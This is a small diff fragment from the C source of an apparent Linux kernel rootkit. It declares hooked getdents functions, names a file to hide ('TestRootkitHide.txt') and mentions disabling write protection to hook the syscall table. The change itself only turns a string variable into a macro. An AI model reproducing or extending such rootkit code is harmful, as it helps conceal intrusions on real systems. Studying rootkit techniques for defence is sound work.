@@ -24,7 +24,7 @@ asmlinkage long fake_getdents(unsigned int fd, struct linux_dirent __user *dirp,
 asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 
 /*************** What file we gonna hide ********************/
-static char* targetfile = "TestRootkitHide.txt";
+#define targetfile "TestRootkitHide.txt"
 
 /*
  * Disable write protection for hook system call table
